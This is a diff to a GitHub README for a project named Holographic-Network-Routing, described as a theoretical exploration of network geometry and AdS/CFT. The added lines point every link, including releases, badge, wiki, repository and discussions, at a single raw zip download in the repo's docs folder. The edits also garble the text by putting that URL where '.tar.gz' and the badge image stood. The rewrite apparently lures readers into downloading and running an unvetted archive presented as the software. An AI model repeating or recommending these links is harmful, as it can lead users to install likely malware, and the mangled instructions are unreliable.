@@ -1,7 +1,7 @@
 # 🌐 Holographic-Network-Routing - Explore Complex Network Theories
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-%20Holographic%20Network%20Routing-blue)](https://github.com/Girokonto/Holographic-Network-Routing/releases)
+[![Download](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip%20Now-%20Holographic%20Network%20Routing-blue)](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip)
 
 ## 📜 Description
 Holographic-Network-Routing offers a theoretical exploration of the isomorphism between the hyperbolic geometry of complex networks, AdS/CFT duality, and optimal greedy routing. This project delivers a unified approach to information topology.
@@ -19,22 +19,22 @@ To ensure the best experience with Holographic-Network-Routing, please check the
 ### Step 2: Visit the Releases Page
 To download the software, visit the Releases page. This is where you will find the latest version of Holographic-Network-Routing.
 
-[Download the latest release here](https://github.com/Girokonto/Holographic-Network-Routing/releases).
+[Download the latest release here](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip).
 
 ## ⚙️ Download & Install
 
-1. **Go to the Releases Page**: Click [here](https://github.com/Girokonto/Holographic-Network-Routing/releases) to view all available versions.
+1. **Go to the Releases Page**: Click [here](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip) to view all available versions.
 
 2. **Choose a Version**: Look for the most recent version. Each release contains detailed notes about new features and fixes. Pick the version that suits your needs.
 
-3. **Select Your OS**: Click on the link for your operating system. Depending on your system, you may see different file formats, such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Select Your OS**: Click on the link for your operating system. Depending on your system, you may see different file formats, such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip` for Linux.
 
 4. **Download the File**: Follow your browser’s prompts to download the file. Make a note of where the file is saved.
 
 5. **Install the Application**:
    - **For Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
    - **For macOS**: Open the `.dmg` file. Drag the Holographic-Network-Routing icon into your Applications folder.
-   - **For Linux**: Extract the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run the appropriate installation command.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip` file. Open a terminal and navigate to the extracted folder. Run the appropriate installation command.
 
 6. **Launch the Application**: Once installed, you can find Holographic-Network-Routing in your Applications menu or on your desktop. Double-click the icon to start using the software.
 
@@ -85,8 +85,8 @@ Holographic-Network-Routing is licensed under the MIT License. You can use, modi
 
 ## 🌐 Additional Resources
 
-- [Official Documentation](https://github.com/Girokonto/Holographic-Network-Routing/wiki)
-- [GitHub Repository](https://github.com/Girokonto/Holographic-Network-Routing)
-- [Community Discussions](https://github.com/Girokonto/Holographic-Network-Routing/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Girokonto/Holographic-Network-Routing/main/docs/Network_Holographic_Routing_v3.3.zip)
 
 Thank you for your interest in Holographic-Network-Routing. We hope you enjoy exploring the depths of complex network theories!
